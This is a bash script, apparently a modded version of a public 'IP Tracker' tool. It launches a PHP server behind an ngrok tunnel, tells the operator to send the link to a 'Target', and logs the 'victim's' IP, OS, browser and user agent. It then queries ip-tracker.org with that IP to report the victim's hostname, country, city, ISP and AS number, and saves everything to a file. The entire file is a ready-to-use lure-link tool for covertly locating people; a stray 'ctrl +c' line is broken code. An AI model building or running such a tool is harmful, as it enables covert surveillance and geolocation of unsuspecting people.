#!/bin/bash
trap 'printf "\n";stop;exit 1' 2
printf '''\e[1;92m
              (
               )
              (
        /\  .-"""-.  /\
       //\\/  ,,,  \//\\
       |/\| ,;;;;;, |/\|
       //\\\;-"""-;///\\ \e[1;93m
      //  \/   .   \/  \\
     (| ,-_| \ | / |_-, |)
       //`__\.-.-./__`\\ \
      // /.-(() ())-.\ \\
     (\ |)   '---'   (| /)
      ` (|           |) `
        \)           (/

'''
start() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
if [[ -e ip.txt ]]; then
rm -rf ip.txt

fi
printf "\e[1;93m[\e[0m*\e[1;93m] Name    : IP Tracker \n"   
printf "\e[1;94m[\e[0m*\e[1;94m] Thanks  : @thelinuxchoice \n"
printf "\e[1;95m[\e[0m*\e[1;95m] Thanks  : Victor Stanciu \n"
printf "\e[1;96m[\e[0m*\e[1;96m] Moded   : Mr.silent coder \n"
printf "\e[1;31m[\e[0m*\e[1;31m] Warning : Stay Legal! \n\n"
printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
sudo php -S "127.0.0.1:3333" > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link


printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
break
  fi
sleep 1
done 

}

catch_ip(){

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
os=$(grep 'OS:' ip.txt | cut -d " " -f2)
IFS=$'\n'
bsr=$(grep 'Browser:' ip.txt | cut -d " " -f2)
IFS=$'\n'
uaget=$(grep 'User_agent:' ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim OS:\e[0m\e[1;77m %s\e[0m\n" $os
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim Browser:\e[0m\e[1;77m %s\e[0m\n" $bsr
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;77m %s\e[0m\n" $uaget
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat ip.txt >> saved.ip.txt
killall -2 php > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
exit 1
ctrl +c
}

stop() {


checkphp=$(ps aux | grep -o "php" | head -n1)

if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
killall ngrok > /dev/null 2>&1
fi


}

start
